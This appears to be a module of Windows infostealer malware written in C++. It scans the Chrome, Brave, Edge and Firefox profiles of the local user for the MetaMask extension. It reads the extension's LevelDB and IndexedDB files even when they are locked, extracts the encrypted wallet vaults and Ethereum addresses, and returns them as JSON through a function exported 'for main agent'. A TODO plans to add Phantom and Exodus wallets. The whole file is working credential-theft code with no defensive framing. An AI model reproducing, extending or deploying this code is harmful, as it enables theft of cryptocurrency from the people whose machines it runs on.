#include <windows.h>
#include <algorithm>
#include <shlobj.h>
#include <string>
#include <vector>
#include <sstream>
#include <fstream>
#include "../common.h"
#include "../utils.h"

// External logging functions
extern "C" {
    void LogInfo(const char* message);
    void LogError(const char* message);
    void LogWarning(const char* message);
}

struct WalletExtension {
    std::string name;
    std::string chromeId;
    std::string firefoxId;
    std::vector<std::string> searchKeys;
};


struct MetaMaskWallet {
    std::string browser;
    std::string profile;
    std::vector<std::string> vaults;
    std::vector<std::string> accounts;
    bool hasVault;
};

class MetaMaskExtractor {
private:
    std::vector<MetaMaskWallet> wallets;
    
public:
    MetaMaskExtractor() {
        FindMetaMaskExtensions();
    }
    
    std::string ExtractAll() {
        std::stringstream json;
        json << "{";
        json << "\"wallet_type\":\"metamask\",";
        json << "\"wallets\":[";
        
        bool first = true;
        for (const auto& wallet : wallets) {
            if (!first) json << ",";
            first = false;
            
            json << "{";
            json << "\"browser\":\"" << wallet.browser << "\",";
            json << "\"profile\":\"" << wallet.profile << "\",";
            json << "\"has_vault\":" << (wallet.hasVault ? "true" : "false") << ",";
            json << "\"accounts_count\":" << wallet.accounts.size() << ",";
            
            // Add vault data (encrypted)
            json << "\"vaults\":[";
            bool firstVault = true;
            for (const auto& vault : wallet.vaults) {
                if (!firstVault) json << ",";
                firstVault = false;
                json << "\"" << EscapeJson(vault) << "\"";
            }
            json << "],";
            
            // Add accounts (addresses)
            json << "\"accounts\":[";
            bool firstAccount = true;
            for (const auto& account : wallet.accounts) {
                if (!firstAccount) json << ",";
                firstAccount = false;
                json << "\"" << account << "\"";
            }
            json << "]";
            
            json << "}";
        }
        
        json << "]}";
        
        return json.str();
    }
    
private:
    void FindMetaMaskExtensions() {
        // Check Chrome extensions
        CheckChromeMetaMask();
        
        // Check Firefox extensions
        CheckFirefoxMetaMask();
        
        // Check Brave extensions
        CheckBraveMetaMask();
        
        // Check Edge extensions
        CheckEdgeMetaMask();
    }
    
    void CheckChromeMetaMask() {
        WCHAR localAppData[MAX_PATH];
        if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData))) {
            std::wstring basePath = std::wstring(localAppData) + L"\\Google\\Chrome\\User Data";
            
            // Check default profile and numbered profiles
            std::vector<std::wstring> profiles = {L"Default", L"Profile 1", L"Profile 2", L"Profile 3"};
            
            for (const auto& profile : profiles) {
                std::wstring extensionPath = basePath + L"\\" + profile + L"\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn";
                
                if (Utils::DirectoryExists(extensionPath)) {
                    MetaMaskWallet wallet;
                    wallet.browser = "chrome";
                    wallet.profile = Utils::WStringToString(profile);
                    
                    // Look for LevelDB files
                    ExtractLevelDBData(extensionPath, wallet);
                    
                    if (wallet.hasVault || !wallet.accounts.empty()) {
                        wallets.push_back(wallet);
                    }
                }
            }
        }
    }
    
    void CheckFirefoxMetaMask() {
        WCHAR appData[MAX_PATH];
        if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, appData))) {
            std::wstring firefoxPath = std::wstring(appData) + L"\\Mozilla\\Firefox\\Profiles";
            
            WIN32_FIND_DATAW findData;
            std::wstring searchPath = firefoxPath + L"\\*";
            
            HANDLE hFind = FindFirstFileW(searchPath.c_str(), &findData);
            if (hFind != INVALID_HANDLE_VALUE) {
                do {
                    if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                        std::wstring dirName = findData.cFileName;
                        if (dirName != L"." && dirName != L"..") {
                            std::wstring profilePath = firefoxPath + L"\\" + dirName;
                            std::wstring storagePath = profilePath + L"\\storage\\default\\moz-extension+++";
                            
                            // Firefox uses different storage structure
                            CheckFirefoxExtensionStorage(storagePath, dirName);
                        }
                    }
                } while (FindNextFileW(hFind, &findData));
                FindClose(hFind);
            }
        }
    }
    
    void CheckBraveMetaMask() {
        WCHAR localAppData[MAX_PATH];
        if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData))) {
            std::wstring basePath = std::wstring(localAppData) + L"\\BraveSoftware\\Brave-Browser\\User Data";
            
            std::vector<std::wstring> profiles = {L"Default", L"Profile 1", L"Profile 2"};
            
            for (const auto& profile : profiles) {
                std::wstring extensionPath = basePath + L"\\" + profile + L"\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn";
                
                if (Utils::DirectoryExists(extensionPath)) {
                    MetaMaskWallet wallet;
                    wallet.browser = "brave";
                    wallet.profile = Utils::WStringToString(profile);
                    
                    ExtractLevelDBData(extensionPath, wallet);
                    
                    if (wallet.hasVault || !wallet.accounts.empty()) {
                        wallets.push_back(wallet);
                    }
                }
            }
        }
    }
    
    void CheckEdgeMetaMask() {
        WCHAR localAppData[MAX_PATH];
        if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData))) {
            std::wstring basePath = std::wstring(localAppData) + L"\\Microsoft\\Edge\\User Data";
            
            std::vector<std::wstring> profiles = {L"Default", L"Profile 1", L"Profile 2"};
            
            for (const auto& profile : profiles) {
                std::wstring extensionPath = basePath + L"\\" + profile + L"\\Local Extension Settings\\ejbalbakoplchlghecdalmeeeajnimhm";
                
                if (Utils::DirectoryExists(extensionPath)) {
                    MetaMaskWallet wallet;
                    wallet.browser = "edge";
                    wallet.profile = Utils::WStringToString(profile);
                    
                    ExtractLevelDBData(extensionPath, wallet);
                    
                    if (wallet.hasVault || !wallet.accounts.empty()) {
                        wallets.push_back(wallet);
                    }
                }
            }
        }
    }
    
    void ExtractLevelDBData(const std::wstring& dbPath, MetaMaskWallet& wallet) {
        // Look for .ldb and .log files
        WIN32_FIND_DATAW findData;
        std::wstring searchPath = dbPath + L"\\*.ldb";
        
        HANDLE hFind = FindFirstFileW(searchPath.c_str(), &findData);
        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                std::wstring filePath = dbPath + L"\\" + findData.cFileName;
                ExtractDataFromFile(filePath, wallet);
            } while (FindNextFileW(hFind, &findData));
            FindClose(hFind);
        }
        
        // Also check .log files
        searchPath = dbPath + L"\\*.log";
        hFind = FindFirstFileW(searchPath.c_str(), &findData);
        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                std::wstring filePath = dbPath + L"\\" + findData.cFileName;
                ExtractDataFromFile(filePath, wallet);
            } while (FindNextFileW(hFind, &findData));
            FindClose(hFind);
        }
    }
    
    void ExtractDataFromFile(const std::wstring& filePath, MetaMaskWallet& wallet) {
        // Try to open with maximum sharing to avoid file locks
        HANDLE hFile = CreateFileW(filePath.c_str(), GENERIC_READ,
                                  FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                                  NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        
        if (hFile == INVALID_HANDLE_VALUE) {
            DWORD error = GetLastError();
            if (error == ERROR_SHARING_VIOLATION || error == ERROR_LOCK_VIOLATION) {
                // File is locked, skip silently to avoid crashes
                return;
            }
            return;
        }
        
        LARGE_INTEGER fileSize;
        GetFileSizeEx(hFile, &fileSize);
        
        // Limit file size to prevent memory issues
        if (fileSize.QuadPart > 10 * 1024 * 1024) { // 10MB limit
            CloseHandle(hFile);
            return;
        }
        
        std::vector<char> buffer((size_t)fileSize.QuadPart);
        DWORD bytesRead;
        ReadFile(hFile, buffer.data(), (DWORD)buffer.size(), &bytesRead, NULL);
        CloseHandle(hFile);
        
        std::string content(buffer.begin(), buffer.end());
        
        // Look for vault data
        size_t vaultPos = content.find("\"vault\"");
        if (vaultPos != std::string::npos) {
            // Extract vault JSON
            size_t start = content.find("{", vaultPos);
            if (start != std::string::npos) {
                int braceCount = 1;
                size_t end = start + 1;
                
                while (braceCount > 0 && end < content.length()) {
                    if (content[end] == '{') braceCount++;
                    else if (content[end] == '}') braceCount--;
                    end++;
                }
                
                if (braceCount == 0) {
                    std::string vaultData = content.substr(start, end - start);
                    wallet.vaults.push_back(vaultData);
                    wallet.hasVault = true;
                }
            }
        }
        
        // Look for accounts (Ethereum addresses)
        size_t pos = 0;
        while ((pos = content.find("0x", pos)) != std::string::npos) {
            // Check if this looks like an Ethereum address (42 chars including 0x)
            if (pos + 42 <= content.length()) {
                std::string potentialAddress = content.substr(pos, 42);
                if (IsValidEthereumAddress(potentialAddress)) {
                    // Check if we already have this address
                    if (std::find(wallet.accounts.begin(), wallet.accounts.end(), potentialAddress) == wallet.accounts.end()) {
                        wallet.accounts.push_back(potentialAddress);
                    }
                }
            }
            pos += 2;
        }
    }
    
    void CheckFirefoxExtensionStorage(const std::wstring& storagePath, const std::wstring& profileName) {
        WIN32_FIND_DATAW findData;
        std::wstring searchPath = storagePath + L"*";
        
        HANDLE hFind = FindFirstFileW(searchPath.c_str(), &findData);
        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                    std::wstring dirName = findData.cFileName;
                    if (dirName != L"." && dirName != L"..") {
                        // Check if this might be MetaMask
                        std::wstring idbPath = storagePath + dirName + L"\\idb";
                        if (Utils::DirectoryExists(idbPath)) {
                            MetaMaskWallet wallet;
                            wallet.browser = "firefox";
                            wallet.profile = Utils::WStringToString(profileName);
                            
                            // Firefox stores data differently, look for IndexedDB files
                            ExtractFirefoxIndexedDB(idbPath, wallet);
                            
                            if (wallet.hasVault || !wallet.accounts.empty()) {
                                wallets.push_back(wallet);
                            }
                        }
                    }
                }
            } while (FindNextFileW(hFind, &findData));
            FindClose(hFind);
        }
    }
    
    void ExtractFirefoxIndexedDB(const std::wstring& idbPath, MetaMaskWallet& wallet) {
        // Look for .sqlite files in IndexedDB
        WIN32_FIND_DATAW findData;
        std::wstring searchPath = idbPath + L"\\*.sqlite";
        
        HANDLE hFind = FindFirstFileW(searchPath.c_str(), &findData);
        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                std::wstring filePath = idbPath + L"\\" + findData.cFileName;
                
                // Try to extract data from SQLite file
                // This is simplified - real implementation would parse IndexedDB structure
                HANDLE hFile = CreateFileW(filePath.c_str(), GENERIC_READ,
                                          FILE_SHARE_READ | FILE_SHARE_WRITE,
                                          NULL, OPEN_EXISTING, 0, NULL);
                
                if (hFile != INVALID_HANDLE_VALUE) {
                    LARGE_INTEGER fileSize;
                    GetFileSizeEx(hFile, &fileSize);
                    
                    if (fileSize.QuadPart < 10 * 1024 * 1024) { // 10MB limit
                        std::vector<char> buffer((size_t)fileSize.QuadPart);
                        DWORD bytesRead;
                        ReadFile(hFile, buffer.data(), (DWORD)buffer.size(), &bytesRead, NULL);
                        
                        std::string content(buffer.begin(), buffer.end());
                        
                        // Look for vault patterns
                        if (content.find("vault") != std::string::npos ||
                            content.find("keyring") != std::string::npos) {
                            wallet.hasVault = true;
                        }
                        
                        // Extract Ethereum addresses
                        size_t pos = 0;
                        while ((pos = content.find("0x", pos)) != std::string::npos) {
                            if (pos + 42 <= content.length()) {
                                std::string potentialAddress = content.substr(pos, 42);
                                if (IsValidEthereumAddress(potentialAddress)) {
                                    if (std::find(wallet.accounts.begin(), wallet.accounts.end(), potentialAddress) == wallet.accounts.end()) {
                                        wallet.accounts.push_back(potentialAddress);
                                    }
                                }
                            }
                            pos += 2;
                        }
                    }
                    
                    CloseHandle(hFile);
                }
            } while (FindNextFileW(hFind, &findData));
            FindClose(hFind);
        }
    }
    
    bool IsValidEthereumAddress(const std::string& address) {
        if (address.length() != 42) return false;
        if (address.substr(0, 2) != "0x") return false;
        
        // Check if remaining characters are hexadecimal
        for (size_t i = 2; i < 42; i++) {
            char c = address[i];
            if (!((c >= '0' && c <= '9') || 
                  (c >= 'a' && c <= 'f') || 
                  (c >= 'A' && c <= 'F'))) {
                return false;
            }
        }
        
        return true;
    }
    
    std::string EscapeJson(const std::string& str) {
        std::string result;
        for (char c : str) {
            switch (c) {
                case '"': result += "\\\""; break;
                case '\\': result += "\\\\"; break;
                case '\b': result += "\\b"; break;
                case '\f': result += "\\f"; break;
                case '\n': result += "\\n"; break;
                case '\r': result += "\\r"; break;
                case '\t': result += "\\t"; break;
                default:
                    if (c >= 0x20 && c <= 0x7E) {
                        result += c;
                    } else {
                        char buf[7];
                        snprintf(buf, sizeof(buf), "\\u%04x", (unsigned char)c);
                        result += buf;
                    }
            }
        }
        return result;
    }
};

// Main crypto extraction function
class CryptoExtractor {
public:
    std::string ExtractAll() {
        std::stringstream json;
        json << "{";
        json << "\"crypto_wallets\":[";
        
        // Extract MetaMask
        MetaMaskExtractor metamask;
        std::string metamaskData = metamask.ExtractAll();
        json << metamaskData;
        
        // TODO: Add other wallets (Phantom, Exodus, etc.)
        // For now, just MetaMask
        
        json << "]}";
        
        return json.str();
    }
};

// Export function for main agent
extern "C" {
    const char* ExtractCryptoData() {
        static std::string result;
        
        try {
            CryptoExtractor extractor;
            result = extractor.ExtractAll();
            
            extern void LogInfo(const char*);
            LogInfo("Crypto wallet data extraction completed");
            
            return result.c_str();
        } catch (...) {
            extern void LogError(const char*);
            LogError("Failed to extract crypto wallet data");
            
            result = "{\"crypto_wallets\":[]}";
            return result.c_str();
        }
    }
}